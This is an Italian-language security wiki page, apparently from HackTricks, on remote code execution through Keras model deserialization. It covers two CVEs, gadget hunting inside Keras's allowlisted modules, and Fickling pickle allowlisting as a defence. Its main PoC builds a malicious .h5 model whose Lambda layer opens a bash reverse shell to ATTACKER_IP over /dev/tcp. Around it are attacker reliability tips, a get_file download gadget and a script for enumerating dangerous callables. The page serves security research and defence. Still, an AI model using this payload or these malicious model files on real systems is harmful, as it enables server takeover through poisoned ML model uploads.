# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Questa pagina riassume tecniche pratiche di exploitation contro la pipeline di deserializzazione dei modelli Keras, spiega gli interni del formato .keras nativo e l'attack surface, e fornisce un toolkit per ricercatori per trovare Model File Vulnerabilities (MFVs) e post-fix gadgets.

## Interni del formato .keras

Un file .keras è un archivio ZIP contenente almeno:
- metadata.json – informazioni generiche (es. versione di Keras)
- config.json – architettura del modello (primary attack surface)
- model.weights.h5 – pesi in HDF5

Il file config.json guida la deserializzazione ricorsiva: Keras importa moduli, risolve classi/funzioni e ricostruisce layer/oggetti da dizionari controllati dall'attaccante.

Esempio di snippet per un oggetto Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Import di moduli e risoluzione dei simboli dalle chiavi module/class_name
- from_config(...) o invocazione del costruttore con kwargs controllati dall'attacker
- Ricorsione in oggetti nidificati (activations, initializers, constraints, ecc.)

Storicamente, questo esponeva tre primitive a un attacker che confezionava config.json:
- Controllo di quali moduli vengono importati
- Controllo di quali classi/funzioni vengono risolte
- Controllo dei kwargs passati ai costruttori/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa principale:
- Lambda.from_config() usava python_utils.func_load(...) che decodifica base64 e chiama marshal.loads() su byte controllati dall'attacker; il Python unmarshalling può eseguire codice.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigazione:
- Keras impone safe_mode=True per impostazione predefinita. Le funzioni Python serializzate in Lambda sono bloccate a meno che un utente non rinunci esplicitamente impostando safe_mode=False.

Note:
- I formati legacy (vecchi salvataggi HDF5) o codebase più datate potrebbero non applicare i controlli moderni, quindi attacchi in stile “downgrade” possono ancora essere efficaci quando le vittime usano loader più vecchi.

## CVE-2025-1550 – Import arbitrario di moduli in Keras ≤ 3.8

Causa principale:
- _retrieve_class_or_fn utilizzava importlib.import_module() senza restrizioni con stringhe di modulo controllate dall'attaccante provenienti da config.json.
- Impatto: Import arbitrario di qualsiasi modulo installato (o modulo piantato dall'attaccante su sys.path). Il codice al momento dell'import viene eseguito, poi la costruzione dell'oggetto avviene con kwargs forniti dall'attaccante.

Idea di exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Miglioramenti di sicurezza (Keras ≥ 3.9):
- Lista di moduli consentiti: importazioni limitate ai moduli ufficiali dell'ecosistema: keras, keras_hub, keras_cv, keras_nlp
- Safe mode di default: safe_mode=True blocca il caricamento di funzioni serializzate Lambda non sicure
- Controllo di tipo di base: gli oggetti deserializzati devono corrispondere ai tipi attesi

## Sfruttamento pratico: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Molti stack di produzione accettano ancora file di modello legacy TensorFlow-Keras HDF5 (.h5). Se un attaccante può caricare un modello che il server poi carica o su cui esegue inferenza, un layer Lambda può eseguire codice Python arbitrario al load/build/predict.

PoC minimo per creare un .h5 malevolo che esegue una reverse shell quando deserializzato o usato:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Note e suggerimenti per l'affidabilità:
- Punti di attivazione: il codice può essere eseguito più volte (es., durante layer build/first call, model.load_model, e predict/fit). Rendere i payload idempotenti.
- Bloccare le versioni: far corrispondere il TF/Keras/Python della vittima per evitare mismatch di serializzazione. Ad esempio, buildare gli artifact con Python 3.8 e TensorFlow 2.13.1 se è ciò che usa il target.
- Replica rapida dell'ambiente:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validazione: un payload benigno come os.system("ping -c 1 YOUR_IP") aiuta a confermare l'esecuzione (ad es., osservare ICMP con tcpdump) prima di passare a una reverse shell.

## Superficie dei gadget post-fix all'interno della allowlist

Anche con allowlisting e safe mode, rimane una vasta superficie tra i callables di Keras consentiti. Per esempio, keras.utils.get_file può scaricare URL arbitrari in posizioni selezionabili dall'utente.

Gadget via Lambda che fa riferimento a una funzione consentita (non bytecode Python serializzato):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitazione importante:
- Lambda.call() antepone il tensore di input come primo argomento posizionale quando invoca il callable target. I gadget scelti devono tollerare un argomento posizionale extra (o accettare *args/**kwargs). Questo vincola quali funzioni sono utilizzabili.

## Allowlisting degli import pickle per modelli AI/ML (Fickling)

Molti formati di modelli AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, vecchi artifact di TensorFlow, ecc.) incorporano dati pickle di Python. Gli attackers abusano regolarmente degli import GLOBAL di pickle e dei costruttori di oggetti per ottenere RCE o per sostituire il modello durante il caricamento. I scanner basati su blacklist spesso non rilevano import pericolosi nuovi o non elencati.

Una difesa pratica fail-closed è intercettare il deserializzatore pickle di Python e consentire solo un insieme revisionato di import innocui relativi all'ML durante l'unpickling. Trail of Bits’ Fickling implementa questa policy e fornisce una curated ML import allowlist costruita a partire da migliaia di pickle pubblici di Hugging Face.

Modello di sicurezza per gli import “sicuri” (intuizioni distillate dalla ricerca e dalla pratica): i simboli importati usati da un pickle devono contemporaneamente:
- Non eseguire codice né causare esecuzione (no compiled/source code objects, shelling out, hooks, ecc.)
- Non leggere/modificare attributi o elementi arbitrari
- Non importare né ottenere riferimenti ad altri oggetti Python dalla VM del pickle
- Non innescare deserializzatori secondari (es., marshal, nested pickle), neanche indirettamente

Abilita le protezioni di Fickling il prima possibile all'avvio del processo in modo che qualsiasi caricamento pickle effettuato dai framework (torch.load, joblib.load, ecc.) venga controllato:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Suggerimenti operativi:
- Puoi disabilitare temporaneamente/riattivare gli hooks dove necessario:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se un modello noto come sicuro è bloccato, estendi l'allowlist per il tuo ambiente dopo aver esaminato i simboli:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling espone anche guardie runtime generiche se preferisci un controllo più granulare:
- fickling.always_check_safety() per imporre controlli su tutti i pickle.load()
- with fickling.check_safety(): per applicazione limitata a un blocco
- fickling.load(path) / fickling.is_likely_safe(path) per controlli puntuali

- Preferisci formati di modello non basati su pickle quando possibile (es., SafeTensors). Se devi accettare pickle, esegui i loader con privilegi minimi, senza uscita di rete e applica l'allowlist.

Questa strategia allowlist-first blocca dimostrabilmente i percorsi di exploit pickle più comuni nell'ML mantenendo alta la compatibilità. Nel benchmark di ToB, Fickling ha segnalato il 100% dei file maligni sintetici e ha permesso circa il 99% dei file puliti dai principali repository di Hugging Face.


## Toolkit per i ricercatori

1) Scoperta sistematica di gadget nei moduli allowlisted

Enumera i callables candidati in keras, keras_nlp, keras_cv, keras_hub e dai priorità a quelli con effetti collaterali su file/rete/processo/variabili d'ambiente.

<details>
<summary>Elenca i callables potenzialmente pericolosi nei moduli Keras allowlisted</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (no .keras archive needed)

Invia dicts appositamente creati direttamente nei deserializzatori di Keras per apprendere quali params sono accettati e osservare gli effetti collaterali.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Test tra versioni e formati

Keras è presente in più codebase/ere con diversi controlli di sicurezza e formati:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, previsto per la rimozione)
- tf-keras: mantenuto separatamente
- Multi-backend Keras 3 (official): ha introdotto il formato nativo .keras

Ripeti i test attraverso le codebase e i formati (.keras vs legacy HDF5) per individuare regressioni o protezioni mancanti.

## Riferimenti

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
